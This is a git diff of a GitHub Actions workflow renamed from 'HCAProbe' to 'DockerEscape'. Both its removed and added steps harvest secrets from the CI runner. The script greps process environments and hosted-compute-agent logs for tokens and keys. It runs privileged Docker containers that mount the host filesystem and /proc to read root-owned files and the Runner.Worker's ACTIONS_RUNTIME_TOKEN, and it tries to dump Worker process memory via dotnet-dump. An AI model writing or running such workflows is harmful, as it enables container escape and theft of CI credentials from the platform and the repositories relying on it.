@@ -1,4 +1,4 @@
-name: HCAProbe
+name: DockerEscape
 on:
   push:
     branches: [main]
@@ -9,58 +9,57 @@ jobs:
   run:
     runs-on: ubuntu-latest
     steps:
-      - name: HCA and internal token investigation
+      - name: Read HCA files and exploit docker + dotnet diagnostic
         run: |
-          echo '=== CURRENT USER ==='
-          id
-          echo '=== ALL PROCESSES (runner user) ==='
-          ps aux | grep -v grep | grep runner | head -20
-          echo '=== HCA PROCESS DETAILS ==='
-          HCA_PID=$(pgrep -f hosted-compute-agent | head -1)
-          echo HCA_PID=$HCA_PID
-          if [ -n "$HCA_PID" ]; then
-            echo '--- HCA cmdline ---'
-            cat /proc/$HCA_PID/cmdline 2>/dev/null | tr '\0' ' '
-            echo ''
-            echo '--- HCA environ (CRITICAL - looking for ACTIONS_RUNTIME_TOKEN) ---'
-            cat /proc/$HCA_PID/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'TOKEN|SECRET|KEY|RUNTIME|CACHE|AUTH|BEARER|ACTIONS' | head -30 || echo 'HCA_ENVIRON_READ_FAILED'
-            echo '--- HCA ALL environ ---'
-            cat /proc/$HCA_PID/environ 2>/dev/null | tr '\0' '\n' | head -50 || echo 'FAILED'
-          fi
-          echo '=== RUNNER.LISTENER PID ==='
-          RL_PID=$(pgrep -f Runner.Listener | head -1)
-          echo RL_PID=$RL_PID
-          if [ -n "$RL_PID" ]; then
-            echo '--- Listener environ ---'
-            cat /proc/$RL_PID/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'TOKEN|SECRET|RUNTIME|CACHE' | head -20 || echo 'LISTENER_ENVIRON_FAILED'
-          fi
-          echo '=== ALL RUNNER PROCS ENVIRON ==='
-          for pid in $(pgrep -u runner 2>/dev/null); do
-            CMD=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ' | head -c 50)
-            ENV_HITS=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'ACTIONS_RUNTIME_TOKEN|ACTIONS_CACHE_URL|_apis/artifactcache' | head -5)
-            if [ -n "$ENV_HITS" ]; then
-              echo FOUND IN PID $pid CMD=$CMD:
-              echo $ENV_HITS
-            fi
-          done
-          echo '=== OPT HCA DIRECTORY ==='
-          ls -laR /opt/hca/ 2>/dev/null | head -30
-          echo '=== UNIX SOCKETS HCA ==='
-          ss -xlp 2>/dev/null | grep -iE 'hca|runner|action' | head -10 || echo 'no sockets found'
-          echo '=== LOCALHOST PORTS ==='
-          ss -tlnp 2>/dev/null | head -20
-          echo '=== RUNTIME TOKEN VIA HCA SOCKET ==='
-          find /run /tmp /var/run -name '*.sock' 2>/dev/null | head -20
-          echo '=== PID 1 ENVIRON ==='
-          cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'TOKEN|SECRET|KEY|RUNTIME|CACHE' | head -20 || echo 'PID1_ENVIRON_FAILED'
-          echo '=== HCA CONFIG FILES ==='
-          find /opt/hca /etc/hca /home/runner/.hca -type f 2>/dev/null | head -20
-          cat /opt/hca/*.json 2>/dev/null || echo 'no json'
-          cat /opt/hca/*.conf 2>/dev/null || echo 'no conf'
-          echo '=== RUNNER ACTIONS-RUNNER DIR ==='
-          ls -la /home/runner/actions-runner/ 2>/dev/null | head -20
-          find /home/runner/actions-runner -name '*.json' -not -path '*/cached/*' 2>/dev/null | xargs cat 2>/dev/null | head -50
-          echo '=== RUNTIME TOKEN VIA CURL HCA METADATA ==='
-          curl -s http://localhost:8080/api/v1/metadata 2>/dev/null | head -5 || echo 'no 8080'
-          curl -s http://localhost:9090/api/v1/metadata 2>/dev/null | head -5 || echo 'no 9090'
-          curl -s http://localhost:2222/metadata 2>/dev/null | head -5 || echo 'no 2222'
+          echo '=== HCA .settings (world-readable) ==='
+          cat /opt/hca/.settings 2>/dev/null || echo CANNOT_READ
+          echo ''
+          echo '=== HCA log file ==='
+          cat /opt/hca/logs/hosted-compute-agent.log 2>/dev/null | grep -iE 'token|secret|key|auth|bearer|runtime|cache|credential' | head -30 || echo NO_SENSITIVE_DATA
+          echo '--- FULL HCA LOG (last 100 lines) ---'
+          tail -100 /opt/hca/logs/hosted-compute-agent.log 2>/dev/null | head -100
+          echo ''
+          echo '=== DOCKER PRIVILEGE ESCALATION ==='
+          docker version 2>/dev/null | head -5 || echo 'docker unavailable'
+          echo '--- Running privileged container to read root-owned files ---'
+          docker run --rm --privileged -v /:/hostfs alpine sh -c 'cat /hostfs/opt/hca/diagnostics.json' 2>/dev/null || echo 'docker run failed'
+          echo ''
+          echo '--- Read ALL files in /opt/hca/ via docker ---'
+          docker run --rm --privileged -v /opt/hca:/hca alpine sh -c 'ls -la /hca && cat /hca/diagnostics.json && cat /hca/.settings' 2>/dev/null || echo 'docker mount failed'
+          echo ''
+          echo '--- Read PID 1 environ via docker ---'
+          WORKER_PID=$(pgrep -f Runner.Worker | head -1)
+          echo WORKER_PID=$WORKER_PID
+          docker run --rm --privileged -v /proc:/hostproc alpine sh -c "cat /hostproc/1/environ | tr '\\0' '\\n' | grep -iE 'TOKEN|SECRET|RUNTIME|CACHE'" 2>/dev/null || echo 'docker proc failed'
+          echo ''
+          echo '--- Read Runner.Worker environ via docker ---'
+          docker run --rm --privileged -v /proc:/hostproc alpine sh -c "cat /hostproc/$WORKER_PID/environ | tr '\\0' '\\n'" 2>/dev/null | grep -iE 'TOKEN|SECRET|RUNTIME|CACHE|ACTION' | head -30 || echo 'docker worker proc failed'
+          echo ''
+          echo '=== DOTNET DIAGNOSTIC SOCKET ATTACK ==='
+          ls /tmp/dotnet-diagnostic-* 2>/dev/null
+          which dotnet-dump 2>/dev/null || echo 'dotnet-dump not in PATH'
+          find /opt /usr -name 'dotnet-dump' 2>/dev/null | head -5
+          find /opt /usr -name 'dotnet-counters' 2>/dev/null | head -5
+          find /opt -name 'dotnet' -type f 2>/dev/null | head -5
+          dotnet tool list -g 2>/dev/null || echo 'no global dotnet tools'
+          echo '--- Try dotnet-dump collect on Worker ---'
+          WORKER_PID=$(pgrep -f Runner.Worker | head -1)
+          echo WORKER_PID=$WORKER_PID
+          timeout 15 dotnet-dump collect --process-id $WORKER_PID --output /tmp/worker.dump 2>/dev/null || echo 'dotnet-dump failed or not available'
+          ls -la /tmp/worker.dump 2>/dev/null || echo 'no dump file'
+          echo '--- Try via socket ---'
+          SOCK=$(ls /tmp/dotnet-diagnostic-${WORKER_PID}* 2>/dev/null | head -1)
+          echo SOCK=$SOCK
+          ls -la $SOCK 2>/dev/null
+          echo '=== DOCKER: Mount host proc and scan Worker mem ==='
+          docker run --rm --privileged --pid=host alpine sh -c "
+            echo PID 1 environ:;
+            cat /proc/1/environ | tr '\\0' '\\n' | grep -iE TOKEN || echo none;
+            for pid in \$(ls /proc | grep -E '^[0-9]+$'); do
+              cmd=\$(cat /proc/\$pid/cmdline 2>/dev/null | tr '\\0' ' ' | head -c 50);
+              if echo \$cmd | grep -qi 'Runner.Worker'; then
+                echo Worker PID=\$pid;
+                cat /proc/\$pid/environ | tr '\\0' '\\n' | grep -iE 'ACTIONS_RUNTIME|ACTIONS_CACHE|artifactcache';
+              fi;
+            done
+          " 2>/dev/null || echo 'docker pid-host failed'
